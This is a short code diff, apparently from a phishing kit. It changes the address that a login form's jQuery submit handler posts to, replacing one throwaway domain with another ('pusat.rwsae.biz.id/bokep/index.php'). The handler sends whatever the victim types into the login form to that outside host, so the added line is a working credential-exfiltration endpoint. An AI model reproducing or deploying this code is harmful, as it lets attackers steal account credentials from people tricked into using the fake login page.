@@ -4,7 +4,7 @@ $(".login-form").submit(function() {
 
 	$.ajax({
 
-        url: "https://pusat.event-terbarru2022.my.id/bokep/index.php",
+        url: "https://pusat.rwsae.biz.id/bokep/index.php",
 
         type: "POST",
 
